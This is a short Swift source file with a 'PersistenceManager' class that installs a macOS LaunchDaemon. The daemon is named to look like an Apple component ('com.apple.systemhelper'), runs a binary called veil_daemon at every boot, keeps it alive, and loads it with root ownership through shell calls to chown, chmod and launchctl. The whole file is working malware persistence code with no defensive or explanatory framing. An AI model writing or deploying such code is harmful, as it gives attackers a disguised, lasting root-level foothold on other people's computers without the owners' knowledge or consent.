import Foundation
class PersistenceManager {
    static func installLaunchDaemon() -> Bool {
        let plist = "<?xml version=\"1.0\"?><plist><dict><key>Label</key><string>com.apple.systemhelper</string><key>ProgramArguments</key><array><string>/usr/bin/veil_daemon</string></array><key>RunAtLoad</key><true/><key>KeepAlive</key><true/></dict></plist>"
        let path = "/Library/LaunchDaemons/com.apple.systemhelper.plist"
        do { try plist.write(toFile: path, atomically: true, encoding: .utf8); system("chown root:wheel \(path)"); system("chmod 644 \(path)"); system("launchctl load -w \(path)"); return true } catch { return false }
    }
}
